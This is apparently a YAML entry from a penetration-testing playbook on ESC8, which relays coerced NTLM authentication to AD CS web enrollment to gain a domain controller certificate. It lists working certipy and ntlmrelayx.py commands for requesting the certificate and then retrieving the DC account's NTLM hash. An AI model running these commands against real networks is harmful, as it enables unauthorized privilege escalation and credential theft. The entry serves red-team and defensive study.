title: NTLM Relay to AD CS HTTP Endpoints - ESC8
category: 
  - AD:
    - NTLM
    - ADCS
tactic: Privilege Escalation
tags: []
description:
  - title: ESC8
    content: Exploit weak ADCS configuration to issue a certificate realying coerced authentication to ADCS HTTP Endpoint (ESC8)
    references: 
      - type: image
        value: ntlm_relay_options.webp
        comment: https://www.blackhillsinfosec.com/wp-content/uploads/2022/09/Coercions-and-Relays-The-First-Cred-is-the-Deepest.pdf
      - type: link
        value: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc8
      - type: link
        value: https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/

steps:
  - description: Run a listener to request a certificate
    options:
      - tool: certipy
        usage: certipy relay -ca <CA_address> -template DomainController
        references:
          - type: image
            value: certipy_relay_request.png

      - tool: ntlmrelayx.py
        usage: ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
        references:
          - type: image
            value: ntlmrelayx_relay_request.png
  
  - description: Authenticate and retrieve NTLM hash for the DC account
    options:
      - tool: certipy
        usage: certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
        references:
          - type: image
            value: certipy_auth.png

comments:
  